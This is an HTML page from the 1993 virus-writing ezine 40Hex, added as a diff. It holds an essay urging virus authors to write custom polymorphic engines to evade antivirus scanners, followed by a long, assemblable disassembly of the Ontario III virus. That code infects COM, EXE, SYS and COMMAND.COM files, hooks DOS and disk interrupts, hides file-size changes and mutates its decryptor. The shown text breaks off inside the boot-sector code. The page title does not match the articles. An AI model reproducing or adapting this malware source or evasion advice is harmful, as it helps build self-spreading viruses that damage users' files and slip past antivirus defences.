@@ -1,0 +1,1891 @@
+<html>
+<head><title>Group 42 Sells Out [40H 10.3.1]</title></head>
+<body background="40hex.jpg">
+<center>
+<h2>40Hex Number 10 Volume 3 Issue 1</h2>
+</center>
+<pre>
+40Hex Issue 10 Volume 3 Number 1                                      File 007
+
+A Case Against Simple Encryption And For Polymorphism
+~ ~~~~ ~~~~~~~ ~~~~~~ ~~~~~~~~~~ ~~~ ~~~ ~~~~~~~~~~~~
+
+     In a well-crafted virus, every line of code should serve a definite
+purpose.  No byte should be wasted.  Is encryption, long used by virus
+programmers, still a viable method of eluding scanners and, if not, is
+encryption any longer a necessary part of a virus?
+     The type of encryption found in the typical virus is a simple XOR loop or
+another similar type of operation, i.e. rotate, add, etc.  The idea behind
+encryption was to change the virus during each iteration so that scanners would
+not be able to detect it.  However, such simple encryption hardly serves this
+job, as most scanners simply scan for a pattern found in the encryption.  Only
+a handful delve deeper than the decryption routine.  So the sole purpose of
+simple encryption such as that seen in most viruses nowadays seems to be to
+hide text strings from archaic text searching programs (remember those virus
+books that touted CHK4BOMB as the best thing since rotten Jello?).  But is it
+worth including encryption solely for this purpose?  I think not.  Few people
+search files for unusual text strings and the extra code needed to encrypt a
+file for this purpose may hardly be justified to overcome this obstacle.
+     As mentioned previously, waste should be frowned upon in viruses.
+Unquestionably, the ultimate goal of a virus is to avoid detection while
+spreading to the greatest number of hosts.  It has been established that simple
+decryption patterns do not aid a virus in avoiding detection from scanners.
+And encryption is certainly not a vital part of the replication process.  Thus
+simple attempts at encryption do not add anything of value to the virus.
+     Yet these weak encryption routines _are occasionally_ necessary, but only
+as stepping stones for fledgling virus programmers entering the realm of
+polymorphism.  Without a few simple encryption routines and knowledge of their
+use under his belt, a virus programmer would be hard-pressed to create a truly
+polymorphic virus.  Therefore, it should be noted that simple encryption should
+be used only as part of the learning process.  However, remember also that such
+encryption pales in the face of modern virus scanners and polymorphism is a far
+better alternative.
+     Polymorphism is perhaps the best technique modern viruses use to avoid
+scanners.  The other alternative, stealth techniques, is limited in utility and
+is rendered helpless in the face of simple memory scans.  A combination of the
+two is desirable, yet it is not always possible to implement both in a virus of
+limited size.  So let us examine polymorphism.
+     Polymorphism, in its simplest form, merely consists of a fixed-length
+decryptor with a few bytes which may be altered during each infection.  This is
+merely a small step up from the simple encryption routine.  A few extra XOR
+statements in the code are all that is necessary for implementing such a
+routine.  However, this is, once again, only a small step up; most such fixed-
+length decryptors may be detected by a couple scan strings with wildcards.
+More powerful polymorphism is necessary for evasion of scanners.
+     The MtE and the recently introduced TPE are both powerful products which
+allow every virus to include polymorphism.  However, it is important to note
+that viruses utilising such products may be detected by existing scanners.
+Therefore, it is desirable to write a new polymorphic routine from scratch.
+This will allow for longer survival of the virus.
+     The chief problem with good polymorphism is that the virus should be able
+to detect existing infections of itself in files.  Otherwise, the virus could
+grow beyond limit and much disk space would be taken up in redundant
+infections.  Two methods are commonly used; the infection marker byte and the
+time stamp.  However, such a check is inherently limiting as the virus scanner
+is then able to use said check to its advantage; it need not check files, for
+example, save those which have the seconds field set to eight.  Then again, a
+scanner which functions in this manner would be helpless in detecting another
+virus utilising the identical polymorphic routine but with a different
+infection stamp.
+     The second major difficulty with good polymorphic routines is simply the
+size.  MtE, for example, adds over 2,000 bytes of code.  A working, albeit
+limited, polymorphic routine is possible in half this size, yet it would still
+be 1,000 bytes, a size larger than most viruses.  Increased size, of course,
+increases the disk access time.  While generally irrelevant in a harddisk-based
+environment, this increased infection time becomes crucial when infecting files
+on floppy diskettes.  There are precious few ways of alleviating this problem;
+the only real solution is to decrease the functionality of the polymorphic
+routine and thereby compromise its worth.
+     Taken as a whole, the advantages in utilising polymorphic routines should
+outweigh the disadvantages.  The increased difficulty of scanning may allow the
+virus to slip through the cracks even after a virus scanner claims to detect it
+reliably.  Take, for example, MtE.  To this day, many virus scanners fail to
+accurately report MtE infections; some still trigger false positives.  To
+reiterate a previous point - simple decryption routines are worthless, as they
+fail to serve their main purpose of aiding in the evasion of scanners.  Even
+simple polymorphic routines are easily defeated by scanners; true polymorphism
+or no encryption at all are only alternatives.
+
+                                        Dark Angel
+                                        Phalcon/Skism 1993
+40Hex Issue 10 Volume 3 Number 1                                      File 008
+
+        The Ontario III virus was written by one of our YAM friends up in
+Canada, Death Angel.  The virus infects COM/EXE files.  Additionally, it
+attaches to SYS files yet does not truly infect them.  When the virus is
+executed from a SYS file, it goes resident yet it never alters the interrupt
+vectors.  Therefore, it is merely taking up space in memory.  The virus
+automatically attacks COMSPEC upon receiving control, whether it is in a COM,
+EXE, or SYS host file.  However, I suspect that the virus will have trouble
+dealing with command interpreters apart from COMMAND.COM, as it makes certain
+assumptions, i.e. the end of the file is filled with null characters.  The
+virus utilises a simple polymorphic routine, although the decryptor is of a
+fixed length.  The polymorphism is therefore of questionable utility.
+Additionally, the boot sector is pointless as it is never accessed.  There are
+a few additional bugs in the virus which detract from its overall quality.
+-------------------------------------------------------------------------------
+                .model  tiny
+                .code
+; Ontario III
+; Disassembly by Dark Angel of Phalcon/Skism
+; Assemble with TASM /m ONTARIO3.ASM
+
+; Virus written by Death Angel of YAM
+                org     0
+
+decrypt:
+patch1:
+                mov     di,offset endvirus      ; usually: offset enddecrypt
+patch2          =       $ - 2
+patch3          =       $
+                mov     cx,37E5h
+patch4          =       $ - 2
+patch5:
+                db      82h, 0C5h, 0D0h         ; add ch,0D0h
+patch6          =       $ - 1
+patch7:
+                mov     al,0Ah
+patch8          =       $ - 1
+
+decrypt_loop:
+                add     cs:[di],al
+patch9          =       $ - 1
+patch10:
+                ror     al,cl
+patch11         =       $ - 1
+patch12:
+                inc     di
+patch13:
+                loop    decrypt_loop
+enddecrypt:
+
+patch14:
+                db      89h, 0FBh               ; mov bx,di
+patch15         =       $ - 1
+
+                sub     bx,offset save4
+                xchg    ax,cx
+                dec     ax
+                cld
+                call    saveorigvectors
+                db      0e9h                    ; jmp
+SYSpatch        dw      0                       ; currently jmp to next line
+                int     21h                     ; installation check
+                or      al,ah
+                jz      restorefile
+                push    ds
+                mov     cx,bx
+                mov     di,ds                   ; save current ds
+                mov     ah,13h                  ; get BIOS int 13h handler
+                int     2Fh                     ; to ds:dx and es:bx
+
+                mov     si,ds                   ; does function function?
+                cmp     si,di
+                je      skipit
+                push    ds
+                push    dx
+                mov     ah,13h                  ; restore handler
+                int     2Fh
+
+
+                mov     bx,cx                   ; but save its address too
+                pop     word ptr cs:[bx+storeint13_1]
+                pop     word ptr cs:[bx+storeint13_2]
+skipit:
+                xor     di,di
+                mov     cx,es
+                dec     cx
+                mov     ds,cx                   ; get MCB of current program
+                sub     word ptr [di+3],140h    ; decrease size by 5K
+                mov     ax,[di+12h]             ; get high memory from PSP
+                sub     ax,140h                 ; decrease size by 5K
+                mov     [di+12h],ax             ; replace it
+                mov     es,ax                   ; es->high memory segment
+                sub     ax,1000h
+                mov     word ptr cs:[bx+patchsegment],ax
+                push    cs
+                pop     ds
+                mov     si,bx
+                mov     cx,offset save4
+                rep     movsb
+                mov     ds,cx
+                cli
+                mov     word ptr ds:21h*4,offset int21 ; set int 21h handler
+                mov     ds:21h*4+2,es           ; to virus's
+                sti
+                mov     ax,4BFFh                ; infect COMSPEC
+                push    bx
+                int     21h
+                pop     bx
+                pop     ds
+                push    ds
+                pop     es
+restorefile:
+                lea     si,[bx+offset save4]
+                mov     di,100h
+                cmp     bx,di
+                jb      restoreEXE
+                push    di
+                movsw
+                movsw
+                retn
+restoreEXE:
+                mov     ax,es                   ; get start segment
+                add     ax,10h                  ; adjust for PSP
+                add     cs:[si+2],ax            ; relocate CS
+                add     cs:[si+4],ax            ; relocate SS
+                cli
+                mov     sp,cs:[si+6]            ; restore stack
+                mov     ss,cs:[si+4]
+                sti
+                jmp     dword ptr cs:[si]
+
+int21instcheck:
+                inc     ax
+                iret
+
+int21:
+                cmp     ax,0FFFFh               ; installation check?
+                je      int21instcheck
+                cmp     ah,4Bh                  ; execute?
+                je      execute
+                cmp     ah,11h                  ; FCB find first?
+                je      findfirstnext
+                cmp     ah,12h                  ; FCB find next?
+                je      findfirstnext
+                cmp     ax,3D00h                ; open file read only?
+                jne     int21exit
+                call    handleopen
+int21exit:
+                db      0EAh                    ; jmp far ptr
+oldint21        dd      0
+
+findfirstnext:                                  ; standard stealth routine
+                push    bp
+                mov     bp,sp
+                cmp     word ptr [bp+4],1234h
+patchsegment    =       $ - 2
+                pop     bp
+                jb      int21exit
+                call    callint21               ; do findfirst/next
+                call    pushall
+                mov     ah,2Fh                  ; Get DTA
+                call    callint21
+                cmp     byte ptr es:[bx],0FFh   ; extended FCB?
+                je      findfirstnextnotextendedFCB
+                sub     bx,7                    ; convert to standard
+findfirstnextnotextendedFCB:
+                mov     al,es:[bx+1Eh]          ; get seconds counter
+                and     al,1Fh                  ; check if 62 seconds
+                cmp     al,1Fh                  ; (infection marker)
+                jne     findfirstnextexit       ; exit if not
+                mov     dx,es:[bx+26h]          ; get file size
+                mov     ax,es:[bx+24h]
+                sub     ax,viruslength          ; decrease by virus
+                sbb     dx,0                    ; size
+                or      dx,dx
+                jc      findfirstnextexit
+                mov     es:[bx+26h],dx          ; replace file size
+                mov     es:[bx+24h],ax          ; with "stealthed" one
+findfirstnextexit:
+                call    popall
+                iret
+
+execute:
+                mov     byte ptr cs:infectSYS,0
+                cmp     al,1                    ; load/don't execute
+                je      load_noexecute
+                cmp     al,0FFh                 ; called by virus
+                je      infectCOMSPEC
+                call    infectDSDX
+                jmp     short int21exit
+
+infectCOMMANDCOM:
+                mov     byte ptr cs:infectSYS,0
+                push    dx
+                push    ds
+                mov     dx,offset command_com
+                push    cs
+                pop     ds
+                mov     byte ptr ds:infCOMMAND,0FFh ; infecting COMMAND.COM
+                call    infectDSDX
+                pop     ds
+                pop     dx
+                iret
+
+infectCOMSPEC:
+                mov     ah,51h                  ; Get current PSP
+                call    callint21
+                mov     es,bx
+                mov     ds,es:[2Ch]             ; environment block
+                xor     si,si
+                push    cs
+                pop     es
+infectCOMSPECfindcomspec:
+                mov     di,offset comspec       ; is 'COMSPEC=' the first
+                mov     cx,4                    ; entry in environment?
+                repe    cmpsw                   ; (should be)
+                jcxz    infectCOMSPECnoenvironment ; otherwise, quit
+infectCOMSPECfindend:
+                lodsb                           ; search for end of string
+                or      al,al
+                jnz     infectCOMSPECfindend
+                cmp     byte ptr [si],0         ; found it?
+                jne     infectCOMSPECfindcomspec; nope, try again
+                jmp     short infectCOMMANDCOM  ; otherwise, infect
+infectCOMSPECnoenvironment:
+                mov     dx,si
+                mov     byte ptr cs:infCOMMAND,0FFh ; infecting COMMAND.COM
+                call    infectDSDX              ; but are we really?  Maybe
+                iret                            ; it's 4DOS.  This is a bug.
+load_noexecute:
+                push    es                      ; save parameter block
+                push    bx
+                call    callint21               ; prechain
+                pop     bx
+                pop     es
+                call    pushall
+                jnc     load_noexecute_ok       ; continue if no error
+                jmp     load_noexecute_exit
+load_noexecute_ok:
+                xor     cx,cx
+                lds     si,dword ptr es:[bx+12h]; get entry point on return
+                push    ds
+                push    si
+                mov     di,100h
+                cmp     si,di
+                jl      loading_EXE
+                ja      load_noexecute_quit
+; debugger active
+                lodsb
+                cmp     al,0E9h                 ; check if infected
+                jne     load_noexecute_quit
+                lodsw
+                push    ax                      ; save jmp location
+                lodsb
+                cmp     al,'O'                  ; check for infection marker
+                pop     si                      ; get jmp location
+                jnz     load_noexecute_quit
+                add     si,103h                 ; convert to file offset
+                inc     cx
+                inc     cx
+                pop     ax
+                push    si
+                push    ds
+                pop     es
+                jmp     short check_infection
+loading_EXE:
+                lea     di,[bx+0Eh]             ; check SS:SP on return
+                cmp     word ptr es:[di],9FFh   ; infected?
+                jne     load_noexecute_quit
+check_infection:
+                lodsb
+                cmp     al,0BBh                 ; possibility 1
+                je      infected_checked1
+                cmp     al,0BEh                 ; possibility 2
+                je      infected_checked1
+                cmp     al,0BFh                 ; possibility 3
+                jne     load_noexecute_quit
+infected_checked1:
+                lodsw                           ; get starting offset
+                push    ax                      ; to decrypt
+                lodsb                           ; get next byte
+                cmp     al,0B9h                 ; check for infection
+                lodsw
+                pop     si                      ; offset to decrypt
+                jnz     load_noexecute_quit
+                cmp     ah,7                    ; check if infected
+                je      infected_checked2
+                cmp     al,0E5h                 ; ditto
+                jne     load_noexecute_quit
+infected_checked2:
+                add     si,save4 - enddecrypt
+                jcxz    disinfectEXE
+                rep     movsw
+                jmp     short finish_disinfection
+disinfectEXE:
+                mov     ah,51h                  ; Get current PSP
+                call    callint21
+                add     bx,10h                  ; go to file starting CS
+                mov     ax,[si+6]
+                dec     ax
+                dec     ax
+                stosw
+                mov     ax,[si+4]
+                add     ax,bx
+                stosw
+                movsw
+                lodsw
+                add     ax,bx
+                stosw
+finish_disinfection:
+                pop     di
+                pop     es
+                xchg    ax,cx
+                mov     cx,viruslength
+                rep     stosb
+                jmp     short load_noexecute_exit
+load_noexecute_quit:
+                pop     ax
+                pop     ax
+load_noexecute_exit:
+                call    popall
+                retf    2
+
+
+handleopen:
+                call    pushall
+                mov     si,dx                   ; find extension of
+handleopenscanloop:                             ; ASCIIZ string
+                lodsb
+                or      al,al                   ; found end of screen?
+                jz      handleopenexit          ; yup, no extension -- exit
+                cmp     al,'.'                  ; extension found?
+                jne     handleopenscanloop
+                mov     di,offset validextensions - 3
+                push    cs
+                pop     es
+                mov     cx,4
+                nop
+
+scanvalidextension:
+                push    cx
+                push    si
+                mov     cl,3
+                add     di,cx
+                push    di
+
+check_extension:
+                lodsb
+                and     al,5Fh                  ; Capitalise
+                cmp     al,es:[di]              ; do they compare ok?
+                jne     extension_no_match      ; nope, try next one
+                inc     di
+                loop    check_extension
+
+                cmp     al,'S'                  ; SYS file?
+                jne     opennotSYS
+                mov     byte ptr cs:infectSYS,0FFh ; infecting SYS file
+opennotSYS:
+                call    infectDSDX
+                add     sp,6
+                jmp     short handleopenexit
+extension_no_match:
+                pop     di
+                pop     si
+                pop     cx
+                loop    scanvalidextension
+
+handleopenexit:
+                call    popall
+                retn
+
+infectDSDX:
+                call    pushall
+                call    replaceint13and24
+                push    dx
+                push    ds
+                mov     ax,4300h                ; get attributes
+                call    callint21
+                push    cx
+                pushf
+                jc      go_restoreattribs
+                push    cx
+                and     cl,1                    ; check if read only
+                cmp     cl,1
+                jne     infectDSDXnoclearattributes
+                xor     cx,cx                   ; clear if so
+                mov     ax,4301h
+                call    callint21
+infectDSDXnoclearattributes:
+                pop     cx
+                and     cl,4
+                cmp     cl,4
+                je      go_restoreattribs
+                mov     ax,3D02h                ; open file read/write
+                call    callint21
+                jnc     infectDSDXopenOK        ; continue if no error
+go_restoreattribs:
+                jmp     infectDSDXrestoreattributes
+infectDSDXopenOK:
+                xchg    ax,bx                   ; handle to bx
+                push    cs
+                push    cs
+                pop     ds
+                pop     es
+                mov     word ptr ds:SYSpatch,0
+                mov     ax,5700h                ; save file time/date
+                call    callint21
+                push    dx
+                push    cx
+                and     cl,1Fh                  ; check if infected
+                cmp     cl,1Fh                  ; (seconds == 62)
+                je      infectDSDXerror
+                mov     dx,offset readbuffer    ; read header from
+                mov     cx,1Ch                  ; potential carrier
+                mov     ah,3Fh                  ; file to the
+                call    callint21               ; buffer
+                jnc     infectDSDXreadOK        ; continue if no error
+infectDSDXerror:
+                stc                             ; mark error
+                jmp     infectDSDXclose         ; and exit
+infectDSDXreadOK:
+                cmp     ax,cx                   ; read 1ch bytes?
+                jne     infectDSDXerror         ; exit if not
+                xor     dx,dx
+                mov     cx,dx
+                mov     ax,4202h                ; go to end of file
+                call    callint21
+                or      dx,dx
+                jnz     infectDSDXfilelargeenough
+                cmp     ax,0A01h                ; check if too small
+                jb      infectDSDXerror
+infectDSDXfilelargeenough:
+                cmp     dl,5
+                ja      infectDSDXerror
+                cmp     word ptr ds:readbuffer,'ZM'     ; EXE?
+                je      infectDSDXskipcheck
+                cmp     word ptr ds:readbuffer,'MZ'     ; EXE?
+infectDSDXskipcheck:
+                je      infectDSDXcheckEXE
+                cmp     byte ptr ds:infectSYS,0FFh      ; infecting SYS file?
+                jne     infectDSDXcheckCOM
+                cmp     word ptr ds:readbuffer,0FFFFh   ; check if SYS
+                jne     infectDSDXerror                 ; file
+                cmp     word ptr ds:readbuffer+2,0FFFFh
+isanoverlay:
+                jne     infectDSDXerror
+                or      dx,dx
+                jnz     infectDSDXerror
+                push    ax                      ; save file size
+                mov     di,offset save4
+                mov     ax,5657h                ; push di, push si
+                stosw
+                mov     ax,0E953h               ; push bx, jmp decrypt
+                stosw
+                mov     ax,offset decrypt - (offset save4 + 6)
+                stosw
+                mov     ax,word ptr ds:readbuffer+6 ; get strategy start point
+                stosw
+                pop     ax                      ; get file size
+                push    ax
+                add     ax,offset save4
+                mov     word ptr ds:readbuffer+6,ax
+                mov     word ptr ds:SYSpatch,offset strategy-(offset SYSpatch + 2)
+                mov     byte ptr ds:decrypt_loop,36h    ; replace with SS:
+                pop     ax
+                add     ax,offset enddecrypt
+                jmp     short go_infectDSDXcontinue
+infectDSDXcheckCOM:
+                cmp     byte ptr ds:readbuffer+3,'O'; check if already infected
+jmp_infectDSDXerror:
+                je      infectDSDXerror
+                cmp     byte ptr ds:infCOMMAND,0; infecting COMMAND.COM?
+                je      dontdoslackspace
+                sub     ax,viruslength          ; infect slack space of
+                xchg    ax,dx                   ; command.com
+                xor     cx,cx
+                mov     ax,4200h
+                call    callint21
+dontdoslackspace:
+                mov     si,offset readbuffer
+                mov     di,offset save4
+                movsw
+                movsw
+                sub     ax,3                         ; convert size->jmp dest
+                mov     byte ptr ds:readbuffer,0E9h  ; encode JMP
+                mov     word ptr ds:readbuffer+1,ax  ; and destination
+                mov     byte ptr ds:readbuffer+3,'O' ; mark infected
+                add     ax,116h
+go_infectDSDXcontinue:
+                jmp     short infectDSDXcontinue
+infectDSDXcheckEXE:
+                cmp     word ptr ds:readbuffer+10h,0A01h ; already infected?
+                je      jmp_infectDSDXerror
+                cmp     word ptr ds:readbuffer+1Ah,0
+                jne     isanoverlay             ; exit if it's an overlay
+
+                push    dx
+                push    ax
+                mov     cl,4
+                ror     dx,cl
+                shr     ax,cl
+                add     ax,dx                           ; ax:dx = file size
+                sub     ax,word ptr ds:readbuffer+8     ; subtract header size
+                mov     si,offset readbuffer+14h
+                mov     di,offset origCSIP
+                movsw                           ; save initial CS:IP
+                movsw
+                mov     si,offset readbuffer+0Eh
+                movsw                           ; save initial SS:SP
+                movsw
+                mov     word ptr ds:readbuffer+16h,ax    ; set initial CS
+                mov     word ptr ds:readbuffer+0Eh,ax    ; set initial SS
+                mov     word ptr ds:readbuffer+10h,0A01h ; set initial SP
+                pop     ax
+                pop     dx
+                push    ax
+                add     ax,0A01h
+
+                ; adc dx,0 works just as well
+                jnc     infectEXEnocarry
+                inc     dx
+infectEXEnocarry:
+                mov     cx,200h                 ; take image size
+                div     cx
+                ; The next line is not entirely corrrect.  The image size
+                ; div 512 is rounded up.  Therefore, DOS will find this number
+                ; to be off by 512d bytes
+                mov     word ptr ds:readbuffer+4,ax     ; image size div 512
+                mov     word ptr ds:readbuffer+2,dx     ; image size mod 512
+                pop     ax
+                and     ax,0Fh
+                mov     word ptr ds:readbuffer+14h,ax   ; set initial IP
+                add     ax,offset enddecrypt
+infectDSDXcontinue:
+                mov     word ptr ds:patch2,ax   ; patch start area
+                push    bx                      ; save file handle
+                xor     byte ptr ds:decrypt_loop,18h    ; swap SS: & CS:
+                call    encrypt                 ; encrypt virus to buffer
+                pop     bx                      ; restore file handle
+                mov     ah,40h                  ; Concatenate encrypted
+                call    callint21               ; virus
+                jc      infectDSDXclose         ; exit on error
+                xor     dx,dx
+                mov     cx,dx
+                mov     ax,4200h                ; go to start of file
+                call    callint21
+                jc      infectDSDXclose
+                mov     dx,offset readbuffer
+                mov     cx,1Ch
+                mov     ah,40h                  ; Write new header
+                call    callint21
+infectDSDXclose:
+                pop     cx
+                pop     dx
+                jc      infectDSDXnoaltertime
+                cmp     byte ptr ds:infCOMMAND,0FFh ; infecting COMMAND.COM?
+                je      infectDSDXnoaltertime
+                or      cl,1Fh                  ; set time to 62 seconds
+infectDSDXnoaltertime:
+                mov     ax,5701h                ; restore file time/date
+                call    callint21
+                mov     ah,3Eh                  ; Close file
+                call    callint21
+infectDSDXrestoreattributes:
+                mov     byte ptr cs:infCOMMAND,0
+                mov     byte ptr cs:infectSYS,0
+                popf
+                pop     cx
+                pop     ds
+                pop     dx
+                jc      infectDSDXexit
+                mov     ax,4301h                ; restore file attributes
+                call    callint21
+infectDSDXexit:
+                call    restoreint13and24
+                call    popall
+                retn
+
+pushall:
+                push    bp
+                mov     bp,sp
+                push    bx
+                push    cx
+                push    dx
+                push    si
+                push    di
+                push    ds
+                push    es
+                pushf
+                xchg    ax,[bp+2]
+                push    ax
+                mov     ax,[bp+2]
+                retn
+
+popall:
+                pop     ax
+                xchg    ax,[bp+2]
+                popf
+                pop     es
+                pop     ds
+                pop     di
+                pop     si
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     bp
+                retn
+
+replaceint13and24:
+                push    ds
+                xor     ax,ax
+                mov     ds,ax
+                mov     si,13h*4
+                lodsw
+                mov     word ptr cs:origint13_1,ax
+                lodsw
+                mov     word ptr cs:origint13_2,ax
+                mov     si,24h*4
+                lodsw
+                mov     word ptr cs:origint24_1,ax
+                lodsw
+                mov     word ptr cs:origint24_2,ax
+                mov     word ptr ds:13h*4,1234h
+storeint13_1    =       $ - 2
+                mov     word ptr ds:13h*4+2,1234h
+storeint13_2    =       $ - 2
+                mov     word ptr ds:24h*4,offset int24 ; replace int 24 handler
+                mov     ds:24h*4+2,cs
+                pop     ds
+                retn
+
+restoreint13and24:
+                xor     ax,ax
+                mov     ds,ax
+                mov     word ptr ds:13h*4,1234h
+origint13_1     =       $ - 2
+                mov     word ptr ds:13h*4+2,1234h
+origint13_2     =       $ - 2
+                mov     word ptr ds:24h*4,1234h
+origint24_1     =       $ - 2
+                mov     word ptr ds:24h*4+2,1234h
+origint24_2     =       $ - 2
+                retn
+
+int24:
+                xor     al,al
+                iret
+
+encrypt:
+                mov     di,offset patch4
+                mov     si,di
+                mov     word ptr [si],offset save4 - offset enddecrypt
+                xor     bx,bx
+                call    random
+                jz      encrypt1
+                add     bl,4
+                inc     di
+encrypt1:
+                call    random
+                in      al,40h                  ; get random #
+                mov     bh,al
+                jz      encrypt2
+                add     [di],al                 ; alter amount to encrypt
+                add     bl,28h
+                jmp     short encrypt3
+encrypt2:
+                sub     [di],al                 ; alter amount to encrypt
+encrypt3:
+                add     bl,0C1h
+                mov     [si+3],bx
+                call    random
+                jz      encrypt4
+                xor     byte ptr [si+2],2       ; flip betwen add/sub
+encrypt4:
+                in      ax,40h                  ; get random number != 0
+                or      ax,ax
+                jz      encrypt4
+                mov     bx,3                    ; first choose one of
+                xor     dx,dx                   ; three possible registers
+                div     bx
+                xchg    ax,bx
+                inc     ax                      ; ax = 4
+                mul     dx                      ; convert to offset in
+                xchg    ax,bx                   ; table
+                lea     si,[bx+offset table1]
+                lodsb
+                mov     byte ptr ds:patch1,al
+                lodsb
+                mov     byte ptr ds:patch9,al
+                lodsb
+                mov     byte ptr ds:patch12,al
+                lodsb
+                mov     byte ptr ds:patch15,al
+                call    random
+                jz      encrypt5
+                xor     byte ptr ds:patch13,2 ; loop/loopnz
+encrypt5:
+                in      ax,40h                  ; get random number
+                mov     byte ptr ds:patch8,ah
+                and     ax,0Fh
+                xchg    ax,bx
+                shl     bx,1
+                mov     ax,[bx+offset table2]
+                mov     word ptr ds:patch10,ax
+                xor     si,si
+                mov     di,offset encryptbuffer ; copy virus to
+                mov     cx,endvirus - decrypt   ; temporary buffer
+                push    cx                      ; for encryption
+                cld
+                rep     movsb
+                mov     bx,offset enddecrypt
+                push    word ptr [bx]           ; save it
+                mov     byte ptr [bx],0C3h      ; put retn in its place
+                push    bx
+                xor     byte ptr [bx-7],28h     ; sub/add
+                push    word ptr ds:decrypt_loop
+                mov     byte ptr [bx-8],2Eh     ; CS:
+                mov     dx,offset encryptbuffer
+                add     bx,dx
+                mov     word ptr ds:patch2,bx
+                call    decrypt
+                pop     word ptr ds:decrypt_loop
+                pop     bx
+                pop     word ptr [bx]
+                pop     cx
+                retn
+
+
+random: ; 1/2 chance of zero flag set
+                in      al,40h
+                and     al,1
+                cmp     al,1
+                retn
+
+
+saveorigvectors:
+                push    ds
+                push    ax
+                xor     ax,ax
+                mov     ds,ax
+                mov     ax,ds:13h*4
+                mov     word ptr cs:[bx+storeint13_1],ax
+                mov     ax,ds:13h*4+2
+                mov     word ptr cs:[bx+storeint13_2],ax
+                mov     ax,ds:21h*4
+                mov     word ptr cs:[bx+offset oldint21],ax
+                mov     ax,ds:21h*4+2
+                mov     word ptr cs:[bx+offset oldint21+2],ax
+                pop     ax
+                pop     ds
+                retn
+
+strategy:
+                mov     word ptr cs:[bx+doffset],bx ; save delta offset
+                pop     bx
+                pop     di
+                pop     si
+                call    pushall
+                push    cs
+                pop     ds
+                mov     bx,1234h                ; restore delta offset
+doffset         =       $ - 2
+                db      8bh, 87h                ; mov ax,ds:[save4+6]
+                dw      offset save4 + 6        ; get old strategy entry point
+                mov     word ptr ds:[6],ax      ; and restore to file header
+                int     12h                     ; Get memory size in K
+                sub     ax,5                    ; decrease by 5 K
+                mov     cl,6                    ; convert to paragraphs
+                shl     ax,cl
+                mov     es,ax
+                mov     word ptr ds:[bx+himemsegment],ax
+                cmp     byte ptr es:[3],0B9h    ; check if already installed
+                je      strategyexit
+                mov     si,bx                   ; copy to high memory
+                xor     di,di
+                mov     cx,viruslength
+                rep     movsb
+                pushf
+                db      09Ah    ; call far ptr
+                dw      infectCOMMANDCOM
+himemsegment    dw      0
+
+strategyexit:
+                call    popall
+                jmp     word ptr cs:[6]         ; go to original strategy
+
+table1          db      0BEh, 04h, 46h,0F3h ; si
+                db      0BFh, 05h, 47h,0FBh ; di
+                db      0BBh, 07h, 43h,0DBh ; bx
+
+table2:         inc     al
+                dec     al
+                inc     ax
+                inc     ax
+                dec     ax
+                dec     ax
+                add     al,cl
+                sub     al,cl
+                xor     al,cl
+                xor     al,ch
+                not     al
+                neg     al
+                ror     al,1
+                rol     al,1
+                ror     al,cl
+                rol     al,cl
+                nop
+                nop
+                add     al,ch
+
+comspec         db      'COMSPEC='
+command_com     db      '\COMMAND.COM',0
+
+validextensions db      'COMEXEOVLSYS'
+
+bootsector:     ; offset 600h in the virus
+                jmp     short bootsectorentry
+                nop
+bootparms       db      3Bh dup (0)
+
+bootsectorentry:
+                xor     ax,ax
+                mov     ds,ax
+                cli
+                mov     ss,ax
+                mov     sp,7C00h
+                sti
+                mov     ax,ds:13h*4             ; get int 13h handler
+                mov     word ptr ds:[7C00h+oldint13-bootsector],ax
+                mov     ax,ds:13h*4+2           ; and save it
+                mov     word ptr ds:[7C00h+oldint13+2-bootsector],ax
+                mov     ax,ds:[413h]            ; get total memory
+                sub     ax,2                    ; reduce by 2K
+                mov     ds:[413h],ax            ; replace memory size
+                mov     cl,6
+                shl     ax,cl                   ; convert to paragraphs
+                sub     ax,60h                  ; go to boot block start
+                mov     es,ax
+                mov     si,sp
+                mov     di,offset bootsector
+                mov     cx,100h
+                rep     movsw
+                mov     dx,offset highentry
+                push    es
+                push    dx
+                retf
+highentry:
+                xor     ax,ax                   ; reset disk
+                and     dl,al
+                int     13h
+                push    ds
+                push    es
+                pop     ds
+                pop     es
+                mov     bx,sp                   ; read to 0:7C00h
+                mov     dx,drivehead            ; find where original boot
+                mov     cx,sectortrack          ; block stored and then
+                mov     ax,201h                 ; read original boot
+                int     13h                     ; sector
+                jc      $                       ; halt on error
+                xor     ax,ax                   ; else chain to original
+                mov     ds,ax                   ; boot sector
+                mov     word ptr ds:13h*4,offset int13
+                mov     ds:13h*4+2,cs           ; replace int 13h handler
+                push    es
+                push    bx
+                retf
+
+int13:
+                push    bp
+                mov     bp,sp
+                push    ds
+                push    es
+                push    si
+                push    di
+                push    dx
+                push    cx
+                push    bx
+                push    ax
+                pushf
+                xor     bx,bx
+                mov     ds,bx
+                test    byte ptr ds:[43Fh],1    ; A: spinning?
+                jnz     exitint13               ; exit if so
+                or      dl,dl                   ; default drive?
+                jnz     exitint13               ; exit if not
+                cmp     ah,2                    ; read/write/verify?
+                jb      exitint13
+                cmp     ah,4
+                jbe     trapint13
+exitint13:
+                popf
+                pop     ax
+                pop     bx
+                pop     cx
+                pop     dx
+                pop     di
+                pop     si
+                pop     es
+                pop     ds
+                pop     bp
+                jmp     dword ptr cs:oldint13   ; chain to original handler
+
+trapint13:
+                cld
+                push    cs
+                push    cs
+                pop     es
+                pop     ds
+                xor     cx,cx
+                mov     dx,cx
+                inc     cx
+                mov     bx,offset endvirus      ; read boot block to
+                mov     ax,201h                 ; buffer at endvirus
+                call    callint13
+                jnc     int13readOK
+int13exit:
+                jmp     short exitint13
+int13readOK:
+                cmp     word ptr [bx+15h],501Eh ; push ds, push ax?
+                jne     int13skip
+                cmp     word ptr [bx+35h],0FF2Eh; jmp cs: ?
+                jne     int13skip
+                cmp     word ptr [bx+70h],7505h ; add ax,XX75 ?
+                jne     int13skip
+                mov     dh,1
+                mov     cl,3
+                mov     ax,201h
+                call    callint13
+                xor     dh,dh
+                mov     cl,1
+                mov     ax,301h
+                call    callint13
+int13skip:
+                cmp     word ptr ds:[offset endvirus-bootsector+YAM],'Y*'
+                je      int13exit               ; don't infect self
+                cmp     word ptr ds:[offset endvirus+0Bh],200h
+                jne     int13exit               ; infect only 512 bytes per sector
+                cmp     byte ptr ds:[offset endvirus+0Dh],2
+                jne     int13exit               ; only 2 reserved sectors
+                cmp     word ptr ds:[offset endvirus+1Ah],2
+                ja      int13exit               ; only 2 sec/track
